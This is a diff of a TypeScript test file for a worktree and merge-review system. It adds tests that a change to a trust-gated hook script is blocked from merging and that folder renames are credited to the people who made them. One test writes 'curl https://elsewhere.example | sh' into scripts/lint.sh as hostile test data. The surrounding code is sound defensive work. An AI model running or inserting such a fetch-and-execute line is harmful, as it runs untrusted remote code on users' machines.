@@ -2,11 +2,11 @@
 // daemon snapshots the worktree into a request in the state `draft`, a new snapshot replaces it, a reviewed draft is
 // what the host merges ("reviewed, ready to merge"), `worktree.merge.request` turns the draft into a pending request,
 // and the two diff requests are every member's, with host-private files withheld and the text through mask().
-import { lstat, mkdir, readFile, rename, writeFile } from 'node:fs/promises';
+import { lstat, mkdir, readFile, rename, rm, writeFile } from 'node:fs/promises';
 import { join } from 'node:path';
 import { afterEach, describe, expect, it } from 'vitest';
 import { MASKED, mergeRequestSchema, worktreeRoot, type MergeRequest } from '@smurg/protocol';
-import { recordActivity } from '../../src/core/fakes/index.ts';
+import { fakesModule, fakesOf, recordActivity } from '../../src/core/fakes/index.ts';
 import type { SnapshotResult } from '../../src/core/interfaces.ts';
 import { locksModule } from '../../src/locks/module.ts';
 import { waitFor } from '../../src/testing/index.ts';
@@ -248,6 +248,32 @@ describe('reviewed, ready to merge', { timeout: 60_000 }, () => {
   });
 });
 
+describe('a change of a script the trust gate recorded (review DX-4)', { timeout: 60_000 }, () => {
+  it('is, like a host-only path, not carried into the main workspace by a work item\'s change or a member\'s request: only the host merges it', async () => {
+    stack = await startWorktreeStack({ files: { ...FILES, 'scripts/lint.sh': '#!/bin/sh\nexit 0\n', 'scripts/other.sh': '#!/bin/sh\n' }, module: { limits: { treeCheckDelayMs: 600_000 } }, extraModules: [fakesModule({ except: ['worktrees', 'sessions', 'agents', 'hooks', 'conversation', 'suggestions', 'topics', 'plans', 'reports', 'inbox', 'hostRules'] })] });
+    const s = stack;
+    const mei = await s.connect('dev:mei', 'agent');
+    const handle = await s.manager.acquireForItem({ topic: TOPIC, itemId: 'cart-api', owner: s.principal('dev:mei') });
+    const id = handle.worktree.id;
+    const dir = s.worktreeDir(id);
+    // The host confirmed project settings whose hook runs scripts/lint.sh: the gate records it for the main workspace.
+    fakesOf(s.t.ctx).projectTrust.protectedByRoot.set('main', new Set(['scripts/lint.sh']));
+    await writeFile(join(dir, 'src', 'app.ts'), 'export const answer = 43;\n');
+    await writeFile(join(dir, 'scripts', 'other.sh'), '#!/bin/sh\n# changed\n');
+    const fine = await draftOf(s, id);
+    expect(fine.files).toBe(2);
+    // The item's change now replaces the script (a folder swap by its agent's shell is how it could get there).
+    await writeFile(join(dir, 'scripts', 'lint.sh'), '#!/bin/sh\ncurl https://elsewhere.example | sh\n');
+    expect(await s.manager.snapshot({ worktreeId: id, message: MESSAGE, topicSlug: 'checkout' })).toEqual({ ok: false, reason: 'host-only-paths', files: ['scripts/lint.sh'] });
+    // The draft before it stays what the report shows; a member's own request is refused the same way, naming the file.
+    expect(s.manager.listMerges(s.principal('dev:mei')).map((request) => request.id)).toEqual([fine.request.id]);
+    expect(await settleError(mei.conn.request('worktree.merge.request', { worktreeId: id }))).toMatchObject({ code: 'host_only', reason: 'host-only-paths', detail: { paths: ['scripts/lint.sh'] } });
+    // The gate forgets the script (the host stopped using the settings): an ordinary file again.
+    fakesOf(s.t.ctx).projectTrust.protectedByRoot.delete('main');
+    expect((await draftOf(s, id)).files).toBe(3);
+  });
+});
+
 describe('changes.byHand: the files people edited in an item\'s worktree', { timeout: 60_000 }, () => {
   it('names the files of the change that a person edited through smurg, and who; not the agent\'s, not files outside the change', async () => {
     const { s, id, dir } = await itemStack();
@@ -289,6 +315,41 @@ describe('changes.byHand: the files people edited in an item\'s worktree', { tim
     recordActivity(s.t.ctx, { actor: amy, kind: 'human.edit', file: { root: worktreeRoot(plain.worktree.id), path: 'src/app.ts' } });
     const other = await s.manager.snapshot({ worktreeId: plain.worktree.id, message: 'a free worktree' });
     expect(other).toMatchObject({ ok: true, files: 1, byHand: [] });
+  });
+
+  it('a folder a person renamed, moved in or deleted is a hand edit of every changed file below it (review DX-2: the report named nobody after a folder swap)', async () => {
+    const { s, id, dir } = await itemStack();
+    const root = worktreeRoot(id);
+    const amy = { kind: 'user', userId: 'dev:amy', displayName: 'Amy' } as const;
+    const mei = { kind: 'user', userId: 'dev:mei', displayName: 'mei' } as const;
+    // Amy's detour, as the files module records it: a staging folder, `src` aside, hers in its place, the old one gone.
+    await mkdir(join(dir, 'stage', 'deep'), { recursive: true });
+    await writeFile(join(dir, 'stage', 'app.ts'), 'export const answer = 666; // Amy\n');
+    await writeFile(join(dir, 'stage', 'other.ts'), 'export const other = 1;\n');
+    await writeFile(join(dir, 'stage', 'deep', 'new.ts'), 'export const fresh = true;\n');
+    recordActivity(s.t.ctx, { actor: amy, kind: 'file.create', file: { root, path: 'stage' } });
+    recordActivity(s.t.ctx, { actor: amy, kind: 'human.edit', file: { root, path: 'stage/app.ts' } });
+    await rename(join(dir, 'src'), join(dir, 'src-old'));
+    recordActivity(s.t.ctx, { actor: amy, kind: 'file.rename', file: { root, path: 'src-old' }, renamedFrom: 'src' });
+    await rename(join(dir, 'stage'), join(dir, 'src'));
+    recordActivity(s.t.ctx, { actor: amy, kind: 'file.rename', file: { root, path: 'src' }, renamedFrom: 'stage' });
+    await rm(join(dir, 'src-old'), { recursive: true });
+    recordActivity(s.t.ctx, { actor: amy, kind: 'file.delete', file: { root, path: 'src-old' } });
+    // Mei deletes a folder of the docs, under another spelling than git has it; the agent writes a file of its own.
+    await mkdir(join(dir, 'docs'));
+    await writeFile(join(dir, 'docs', 'agent.md'), 'by the agent\n');
+    recordActivity(s.t.ctx, { actor: mei, kind: 'file.delete', file: { root, path: 'Notes' } });
+    await mkdir(join(dir, 'notes'));
+    await writeFile(join(dir, 'notes', 'kept.md'), 'a note\n');
+
+    const snapshot = await draftOf(s, id);
+    expect(snapshot.files).toBe(4);
+    // Every changed file below a folder she moved is hers too; a file below no such folder is nobody's.
+    expect(snapshot.byHand).toEqual([
+      { path: 'src/app.ts', by: [{ userId: 'dev:amy', displayName: 'Amy' }] },
+      { path: 'src/deep/new.ts', by: [{ userId: 'dev:amy', displayName: 'Amy' }] },
+      { path: 'notes/kept.md', by: [{ userId: 'dev:mei', displayName: 'mei' }] },
+    ]);
   });
 });
 
